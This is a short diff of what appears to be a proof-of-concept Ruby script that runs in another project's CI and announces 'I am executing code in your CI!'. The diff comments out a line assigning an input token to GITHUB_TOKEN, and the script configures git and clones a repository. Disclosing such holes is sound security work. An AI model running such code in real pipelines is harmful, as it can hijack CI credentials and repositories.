@@ -13,7 +13,7 @@ puts "                                   "
 puts " [!] SECURITY VULNERABILITY DETECTED"
 puts " [!] I am executing code in your CI!"
 puts "------------------------------------------------"
-ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
+#ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
 system(" git config --global user.email \"hello@sohom.dev\"")
 system("git config --global user.name \"Sohom\"")
 system("gh repo clone elizabethtl/test-oracle-devrel")
